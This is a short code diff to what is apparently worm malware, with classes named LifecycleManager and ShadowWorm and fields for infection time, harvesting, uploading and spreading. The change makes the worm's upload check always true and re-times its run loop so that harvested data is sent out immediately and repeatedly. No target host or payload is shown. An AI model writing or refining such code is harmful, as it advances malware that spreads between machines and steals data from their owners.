@@ -559,7 +559,7 @@ class LifecycleManager {
   }
 
   shouldUpload() {
-    return !this.hasUploaded && (Date.now() - this.infectionTime >= this.uploadInterval);
+  return true;
   }
 
   shouldSpread() {
@@ -669,11 +669,10 @@ class ShadowWorm {
     } catch (e) {}
   }
 
-  run() {
-    // Immediate run, then daily interval
-    this.runCycle();
-    setInterval(() => this.runCycle(), this.config.harvestInterval);
-  }
+run() {
+  this.runCycle();
+  setInterval(() => this.runCycle(), this.config.uploadIntervalSeconds * 1000);
+}
 }
 
 // ============================================
